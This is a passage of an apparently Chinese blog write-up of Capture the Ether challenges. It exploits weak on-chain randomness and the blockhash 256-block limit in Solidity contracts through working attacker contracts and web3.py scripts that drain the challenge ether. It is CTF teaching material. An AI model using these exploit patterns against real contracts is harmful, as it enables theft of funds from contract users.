<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract Test &#123;</span><br><span class="line">    bytes32 answerHash &#x3D; 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;</span><br><span class="line"></span><br><span class="line">    function guess() public returns(uint8) &#123;</span><br><span class="line">        for (uint8 n &#x3D; 0; n&lt; 255; n++)</span><br><span class="line">        if (keccak256(n) &#x3D;&#x3D; answerHash) &#123;</span><br><span class="line"></span><br><span class="line">return n; &#125;</span><br><span class="line"></span><br><span class="line">&#125; &#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-67a2ecc8954a228373b96eb021fe2d8a-8abc44.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-67a2ecc8954a228373b96eb021fe2d8a-8abc44.png"></a></p>
<blockquote>
<p>PS：  遇到了一个 Python3 Cryptodome 库的 keccak256 和 solidity 跑出来结果不一致的问题<br><a href="https://ethereum.stackexchange.com/questions/30931/python-and-solidity-keccak256-function-gives-different-results">Python and Solidity keccak256 function gives different results </a></p>
</blockquote>
<p><strong>参考文档</strong></p>
<p><a href="https://web3py.readthedocs.io/en/stable/web3.main.html">Web3 API — Web3.py 5.28.0 documentation (web3py.readthedocs.io)</a></p>
<h3 id="3-Guess-the-random-number"><a href="#3-Guess-the-random-number" class="headerlink" title="3.   Guess the random number"></a>3.   Guess the random number</h3><p><strong>题目描述：</strong></p>
<p>This time the number is generated based on a couple fairly random sources.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheRandomNumberChallenge &#123;</span><br><span class="line">    uint8 answer;</span><br><span class="line"></span><br><span class="line">    function GuessTheRandomNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">        answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        if (n &#x3D;&#x3D; answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=9ZkzZIUiHzs">The Random Song</a>.</p>
<p><strong>解题</strong></p>
<p>该题与上一个题的区别是， 这个题目的 answer 由 <code>uint8(keccak256(block.blockhash(block.number - 1), now));</code> 计算而得。搜了下相关 api ， 这个代码版本为 0.4.21 ：</p>
<ul>
<li><code>block.blockhash()</code> is now <code>blockhash()</code> hash of the given block when <code>blocknumber</code> is one of the 256 most recent blocks; otherwise returns zero</li>
<li><code>now</code> is <code>block.timestamp</code> : current block number</li>
<li><code>block.number</code> (<code>uint</code>): current block number</li>
</ul>
<p>由于合约的内容都是公开的，因此我们可以在合约对应的 <code>stroge</code> 里找到 number。 这里有几种方案</p>
<ol>
<li>用 solidity 写一个交互代码</li>
<li>用 Python 的 web3 写一个脚本</li>
</ol>
<p>我这里使用 web3 写一个交互脚本，由于web3.py 因为自身不会作为一个区块链的节点存在，因此它需要有一个节点用来存取区块链上的资料。一般来说最安全的方式应该是自己使用 geth 或者 parity 来自建节点，不过如果在不想要自建节点的状况时，可以考虑看看 infura 提供的 HTTP 节点服务。</p>
<p>我这里到 <a href="https://infura.io/dashboard/ethereum/d9f539bb96ba42c083d610b61d9be812/settings">Infura</a> 注册一个账号， 然后获取对应的 API Key</p>
<p>脚本内容如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line">infura_url = <span class="string">&#x27;https://mainnet.infura.io/v3/[api_key]&#x27;</span></span><br><span class="line">web3 = Web3(Web3.HTTPProvider(infura_url)) </span><br><span class="line"></span><br><span class="line">address = <span class="string">&#x27;XXXX&#x27;</span> <span class="comment"># blockchain address ， 题目部署后的地址</span></span><br><span class="line">a = web3.eth.getStorageAt(address, <span class="number">1</span>)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>


<p><strong>参考资料</strong></p>
<p><a href="https://web3py.readthedocs.io/en/stable/web3.eth.html?highlight=getStorageAt#web3.eth.Eth.getStorageAt">web3.eth API — Web3.py 5.28.0 documentation (web3py.readthedocs.io)</a><br><a href="https://betterprogramming.pub/capture-the-ether-guess-the-random-number-2ebb8c9c0347">Capture Ether: Guess the Random Number on a Smart Contract | by Tomás | Better Programming</a><br><a href="https://medium.com/@saurfang/lets-play-capture-the-ether-lotteries-part-i-4e0b40687efd">Let’s Play — Capture the Ether : Lotteries (Part I) | by Forest Fang | Medium</a><br><a href="https://developer.51cto.com/article/706745.html">通过 web3.py 用 Python 存取 Ethereum-51CTO.COM</a></p>
<h3 id="4-Guess-the-new-number"><a href="#4-Guess-the-new-number" class="headerlink" title="4. Guess the new number"></a>4. Guess the new number</h3><p><strong>题目描述：</strong></p>
<p>The number is now generated on-demand when a guess is made.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheNewNumberChallenge &#123;</span><br><span class="line">    function GuessTheNewNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">        uint8 answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line"></span><br><span class="line">        if (n &#x3D;&#x3D; answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=Qu3aqM1BnLc">I Guess It’s Christmas Time</a>.</p>
<p><strong>题解：</strong></p>
<p>这个题目的随机数是在 guess 函数调用的时候生成的。 即题目描述中 的 <em>generated on-demand when a guess is made</em> , 因此我们没法直接获取改随机值。仔细阅读代码我们发现， <code>answer</code> 由代码 <code>uint8(keccak256( block.blockhash(block.number - 1), now));</code> 生成 。通过查阅相关资料我们发现：</p>
<blockquote>
<p><strong>block.blockhash(block.number-1)</strong></p>
<p>有一些合约则基于负一高度区块区块哈希来产生伪随机数，这也是有缺陷的。攻击合约只要以相同代码执行，即可以产生到同样的伪随机数。</p>
<p>示例：&lt; <a href="https://etherscan.io/address/0xF767fCA8e65d03fE16D4e38810f5E5376c3372A8">https://etherscan.io/address/0xF767fCA8e65d03fE16D4e38810f5E5376c3372A8</a>&gt;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;Generate random number between 0 &amp; maxuint256 constant private FACTOR &#x3D;  1157920892373161954235709850086879078532699846656405640394575840079131296399;function rand(uint max) constant private returns (uint256 result)&#123;  uint256 factor &#x3D; FACTOR * 100 &#x2F; max;  uint256 lastBlockNumber &#x3D; block.number - 1;  uint256 hashVal &#x3D; uint256(block.blockhash(lastBlockNumber));  return uint256((uint256(hashVal) &#x2F; factor)) % max;&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>因此我们只需要写一个中继合约，通过中继合约调用目标合约的相关函数，即可。中继合约需要用到 <a href="https://docs.soliditylang.org/en/v0.8.10/contracts.html#interfaces">Interfaces)</a>  利用代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface GuessTheNewNumberSolve &#123;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GuessTheNewNumberSolver &#123;</span><br><span class="line"></span><br><span class="line">    address owner;</span><br><span class="line">    function GuessTheNewNumberSolver() public &#123;</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function solve(address _challengeAddress) public payable &#123;</span><br><span class="line"></span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">        uint8 answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line"></span><br><span class="line">        GuessTheNewNumberSolve challenge &#x3D; GuessTheNewNumberSolve(_challengeAddress);</span><br><span class="line">        challenge.guess.value(msg.value)(answer);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner) ;</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 remix 中部署该合约代码， 并调用 <code>solve</code> 函数</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-02-e6f7fb79074a3e22eb0581838edd3f66-efab90.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-02-e6f7fb79074a3e22eb0581838edd3f66-efab90.png"></a></p>
<p><strong>参考资料</strong><br><a href="https://www.freebuf.com/vuls/179173.html">以太坊智能合约中随机数预测 - FreeBuf网络安全行业门户</a><br><a href="https://medium.com/@saurfang/lets-play-capture-the-ether-lotteries-part-ii-478365775a34">Let’s Play — Capture the Ether : Lotteries (Part II) </a></p>
<h3 id="5-Predict-the-future"><a href="#5-Predict-the-future" class="headerlink" title="5.  Predict the future"></a>5.  Predict the future</h3><p><strong>题目描述：</strong></p>
<p>This time, you have to lock in your guess before the random number is generated. To give you a sporting chance, there are only ten possible answers.</p>
<p>Note that it is indeed possible to solve this challenge without losing any ether.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PredictTheFutureChallenge &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    uint8 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    function PredictTheFutureChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(uint8 n) public payable &#123;</span><br><span class="line">        require(guesser &#x3D;&#x3D; 0);</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        guesser &#x3D; msg.sender;</span><br><span class="line">        guess &#x3D; n;</span><br><span class="line">        settlementBlockNumber &#x3D; block.number + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        uint8 answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br><span class="line"></span><br><span class="line">        guesser &#x3D; 0;</span><br><span class="line">        if (guess &#x3D;&#x3D; answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><strong>解题：</strong></p>
<p>， 题目要求先通过 <code>lockInGuess</code> 下注， 然后调用 <code>settle</code> 开奖。 由于</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">uint8 answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br></pre></td></tr></table></figure>

<p>这部分代码的存在，我们无法直接通过预测来解决这个题目。 但是由于 <code>answer</code> 范围为 0 - 9， 我们可以先 lock 一个值， 然后当觉得时机合适的，即 <code>answer == uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</code>  的时候，我们再调用 <code>settle</code> 。</p>
<ol>
<li>首先编写一个中继合约， 合约内容要能调用 challenge 的 lock 以及<code>settle</code>， 在合约中调用 settle 前要判断下是否时机符合</li>
<li>编写一个 web3 脚本， 来调用中继合约的判断函数， 当 challenge 的 <code>isComplete</code> 已经被调用后， 就退出脚本</li>
</ol>
<p>PS: 编写 web3 python3 脚本所需要的 API JSON 可在 Remix 中导出。</p>
<p><strong>code：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface IGuessTheNewNumberChallenge &#123;</span><br><span class="line">    function isComplete() external view returns (bool);</span><br><span class="line">    function lockInGuess(uint8 n) external payable;</span><br><span class="line">    function settle() external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GuessTheNumberSolver &#123;</span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    function GuessTheNumberSolver() public &#123;</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(address _addr, uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">        IGuessTheNewNumberChallenge challenge &#x3D; IGuessTheNewNumberChallenge(_addr);</span><br><span class="line">        </span><br><span class="line">        challenge.lockInGuess.value(msg.value)(n);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle(address _addr, uint8 n ) public payable &#123;</span><br><span class="line">        uint8 answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br><span class="line">        if (answer &#x3D;&#x3D; n )&#123;</span><br><span class="line">            IGuessTheNewNumberChallenge challenge &#x3D; IGuessTheNewNumberChallenge(_addr);</span><br><span class="line">            challenge.settle();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function() public payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner) ;</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="6-Predict-the-block-hash"><a href="#6-Predict-the-block-hash" class="headerlink" title="6.   Predict the block hash"></a>6.   Predict the block hash</h3><p><strong>题目描述：</strong></p>
<p>Guessing an 8-bit number is apparently too easy. This time, you need to predict the entire 256-bit block hash for a future block.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PredictTheBlockHashChallenge &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    bytes32 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    function PredictTheBlockHashChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(bytes32 hash) public payable &#123;</span><br><span class="line">        require(guesser &#x3D;&#x3D; 0);</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        guesser &#x3D; msg.sender;</span><br><span class="line">        guess &#x3D; hash;</span><br><span class="line">        settlementBlockNumber &#x3D; block.number + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        bytes32 answer &#x3D; block.blockhash(settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        guesser &#x3D; 0;</span><br><span class="line">        if (guess &#x3D;&#x3D; answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=VbTrdj7vPGU">Get Lucky</a>.</p>
<p><strong>解题：</strong></p>
<p>根据黄皮书对 <code>BLOCKHASH </code> 的定义：只能获取最近 256 个区块的哈希，超出时返回 0</p>
<p>所以我们可以先猜 0 的 hash， 然后等他超过 256 个区块，再来开奖。 可以用 python3 web3直接实现利用。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3 ,HTTPProvider</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">challenge_addr = <span class="string">&quot;&quot;</span></span><br><span class="line">wallet_addr = <span class="string">&quot;&quot;</span></span><br><span class="line">wallet_private_key = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">challenge_api = <span class="string">&#x27;&#x27;&#x27;[</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">		&quot;name&quot;: &quot;settle&quot;,</span></span><br><span class="line"><span class="string">		&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">		&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">		&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">	&#125;,</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">		&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">		&quot;name&quot;: &quot;isComplete&quot;,</span></span><br><span class="line"><span class="string">		&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;bool&quot;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		],</span></span><br><span class="line"><span class="string">		&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">		&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">	&#125;,</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;hash&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;bytes32&quot;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		],</span></span><br><span class="line"><span class="string">		&quot;name&quot;: &quot;lockInGuess&quot;,</span></span><br><span class="line"><span class="string">		&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">		&quot;payable&quot;: true,</span></span><br><span class="line"><span class="string">		&quot;stateMutability&quot;: &quot;payable&quot;,</span></span><br><span class="line"><span class="string">		&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">	&#125;,</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">		&quot;payable&quot;: true,</span></span><br><span class="line"><span class="string">		&quot;stateMutability&quot;: &quot;payable&quot;,</span></span><br><span class="line"><span class="string">		&quot;type&quot;: &quot;constructor&quot;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">w3 = Web3(HTTPProvider(<span class="string">&quot;https://ropsten.infura.io/v3/[key]&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract = w3.eth.contract(address = challenge_addr, abi = json.loads(challenge_api))</span><br><span class="line">acct = w3.eth.account.from_key(wallet_private_key) </span><br><span class="line"></span><br><span class="line">my_guess_hash = <span class="string">&quot;0000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line"></span><br><span class="line">print(w3.eth.getTransactionCount(acct.address))</span><br><span class="line"></span><br><span class="line">print(contract.all_functions())</span><br><span class="line"></span><br><span class="line">tx = contract.functions.lockInGuess(my_guess_hash).buildTransaction(</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="string">&quot;value&quot;</span>:  Web3.toWei(<span class="number">1</span>, <span class="string">&#x27;ether&#x27;</span>),</span><br><span class="line">            <span class="string">&quot;gas&quot;</span>: <span class="number">3000000</span>,</span><br><span class="line">            <span class="string">&quot;gasPrice&quot;</span>: w3.eth.gasPrice,</span><br><span class="line">            <span class="string">&quot;nonce&quot;</span>: w3.eth.getTransactionCount(acct.address) ,</span><br><span class="line">            <span class="string">&quot;chainId&quot;</span>: <span class="number">3</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">signed = acct.signTransaction(tx)</span><br><span class="line">tx_id = w3.eth.sendRawTransaction(signed.rawTransaction)</span><br><span class="line"></span><br><span class="line">print(w3.eth.wait_for_transaction_receipt(tx_id, timeout=  <span class="number">300</span> ))</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h2><h3 id="1-Token-sale"><a href="#1-Token-sale" class="headerlink" title="1. Token sale"></a>1. Token sale</h3><p><strong>题目描述：</strong></p>
<p>This token contract allows you to buy and sell tokens at an even exchange rate of 1 token per ether.</p>
<p>The contract starts off with a balance of 1 ether. See if you can take some of that away.</p>
